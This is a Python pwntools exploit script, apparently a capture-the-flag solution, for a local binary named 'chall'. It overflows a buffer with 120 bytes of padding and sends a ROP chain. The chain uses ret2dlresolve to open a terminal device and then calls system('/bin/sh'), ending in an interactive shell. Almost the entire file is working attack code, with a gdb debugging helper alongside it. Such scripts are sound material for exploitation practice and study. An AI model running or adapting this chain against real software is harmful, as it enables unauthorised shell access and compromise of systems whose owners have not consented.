import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set follow-fork-mode parent\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)


elf = ELF("./chall")
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol="open", args=["/dev/pts/1", 1])
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

dlresolve2 = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.gets(dlresolve2.data_addr)
rop.ret2dlresolve(dlresolve2)

raw_rop = p64(rop.ret.address) + rop.chain()

print(rop.dump())

p = elf.process()
# debug(0x401238)
p.sendline(b"a" * 120 + raw_rop)
pause()
p.sendline(dlresolve.payload)
pause()
p.sendline(dlresolve2.payload)
p.interactive()
